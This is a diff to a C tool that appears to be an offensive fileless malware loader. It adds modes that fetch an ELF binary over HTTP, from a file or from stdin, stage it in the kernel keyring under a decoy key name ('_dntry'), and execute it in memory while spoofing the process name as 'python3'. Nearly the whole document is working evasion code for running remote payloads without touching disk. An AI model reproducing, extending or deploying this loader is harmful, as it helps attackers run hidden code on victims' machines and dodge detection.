@@ -22,6 +22,7 @@ Join :)
 #include <netdb.h>
 #include <netinet/in.h>
 #include <limits.h>
+#include <errno.h>
 
 #ifndef KEY_SPEC_SESSION_KEYRING
 #define KEY_SPEC_SESSION_KEYRING (-3)
@@ -203,17 +204,17 @@ static int drain_to_buf(Buf *b,
                 size_t blen  = hdrlen - (size_t)(body - hdrbuf);
                 size_t extra = (size_t)r - copy;
                 if (blen > 0) {
-                    if (first) { if (!magic_ok(body, blen)) return -1; first = 0; }
+                    if (first) { if (!magic_ok(body, blen)) { sc_write(2, "[-] not ELF\n", 12); return -1; } first = 0; }
                     buf_append(b, body, blen);
                 }
                 if (extra > 0) {
                     uint8_t *e = tmp + copy;
-                    if (first) { if (!magic_ok(e, extra)) return -1; first = 0; }
+                    if (first) { if (!magic_ok(e, extra)) { sc_write(2, "[-] not ELF\n", 12); return -1; } first = 0; }
                     buf_append(b, e, extra);
                 }
             }
         } else {
-            if (first) { if (!magic_ok(tmp, r)) return -1; first = 0; }
+            if (first) { if (!magic_ok(tmp, r)) { sc_write(2, "[-] not ELF\n", 12); return -1; } first = 0; }
             buf_append(b, tmp, r);
         }
     }
@@ -333,6 +334,28 @@ static long keyring_store(const Buf *b)
                        b->data, (long)b->size,
                        (long)KEY_SPEC_SESSION_KEYRING);
     if (key < 0) { perror("add_key"); return -1; }
+    return key;
+}
+
+static long keyring_store_big(const Buf *b)
+{
+    if (b->size > 1048576) {
+        sc_write(2, "[-] big_key max is 1 MiB; payload too large\n", 44);
+        return -1;
+    }
+    long key = syscall(248,
+                       "big_key", "_dntry",
+                       b->data, (long)b->size,
+                       (long)KEY_SPEC_SESSION_KEYRING);
+    if (key < 0) {
+        if (errno == ENODEV)
+            sc_write(2, "[-] big_key not supported (CONFIG_BIG_KEYS not set)\n", 52);
+        else if (errno == EINVAL)
+            sc_write(2, "[-] big_key: EINVAL (payload > 1 MiB or no tmpfs for staging)\n", 62);
+        else
+            perror("add_key big_key");
+        return -1;
+    }
     return key;
 }
 
@@ -566,12 +589,15 @@ static void usage(const char *me)
         "  %s file   <elf> [spoof_name] [args...]  - O_TMPFILE + execveat\n"
         "  %s http   <url> [spoof_name]             - O_TMPFILE + execveat via HTTP\n"
         "  %s stdin  [spoof_name]                   - O_TMPFILE + execveat via stdin\n"
-        "  %s kfile  <elf> [spoof_name]             - keyring + userland exec\n"
-        "  %s khttp  <url> [spoof_name]             - keyring + userland exec via HTTP\n"
-        "  %s kstdin [spoof_name]                   - keyring + userland exec via stdin\n"
+        "  %s kfile  <elf> [spoof_name]             - keyring (user, 20KB) + userland exec\n"
+        "  %s khttp  <url> [spoof_name]             - keyring (user, 20KB) + userland exec via HTTP\n"
+        "  %s kstdin [spoof_name]                   - keyring (user, 20KB) + userland exec via stdin\n"
+        "  %s bkfile  <elf> [spoof_name]            - keyring (big_key, 1MiB) + userland exec\n"
+        "  %s bkhttp  <url> [spoof_name]            - keyring (big_key, 1MiB) + userland exec via HTTP\n"
+        "  %s bkstdin [spoof_name]                  - keyring (big_key, 1MiB) + userland exec via stdin\n"
         "\nspoof_name: argv[0] of loaded process (default: python3)\n"
-        "keyring quota: 20000 bytes/user - raise via /proc/sys/kernel/keys/maxbytes\n",
-        me, me, me, me, me, me);
+        "big_key requires CONFIG_BIG_KEYS=y (default on Ubuntu Server, RHEL 8/9)\n",
+        me, me, me, me, me, me, me, me, me);
     exit(1);
 }
 
@@ -626,6 +652,34 @@ int main(int argc, char *argv[])
             char *spoof = strdup(argc > spoof_idx ? argv[spoof_idx] : "python3");
 
             long key_id = keyring_store(&payload);
+            free(payload.data); payload.data = NULL; payload.size = 0;
+            if (key_id < 0) return 1;
+
+            Buf from_key = {0};
+            if (keyring_load(key_id, &from_key) < 0) return 1;
+
+            char *ea[] = {spoof, NULL};
+            uexec(&from_key, 1, ea, environ, spoof, argc, argv);
+        }
+
+    } else if (strcmp(mode, "bkfile") == 0 || strcmp(mode, "bkhttp") == 0 ||
+               strcmp(mode, "bkstdin") == 0) {
+
+        if (strcmp(mode, "bkfile") == 0) {
+            if (argc < 3) usage(argv[0]);
+            rc = load_from_file(&payload, argv[2]);
+        } else if (strcmp(mode, "bkhttp") == 0) {
+            if (argc < 3) usage(argv[0]);
+            rc = load_from_http(&payload, argv[2]);
+        } else {
+            rc = load_from_stdin(&payload);
+        }
+
+        if (rc == 0) {
+            int spoof_idx = (strcmp(mode, "bkstdin") == 0) ? 2 : 3;
+            char *spoof = strdup(argc > spoof_idx ? argv[spoof_idx] : "python3");
+
+            long key_id = keyring_store_big(&payload);
             free(payload.data); payload.data = NULL; payload.size = 0;
             if (key_id < 0) return 1;
 
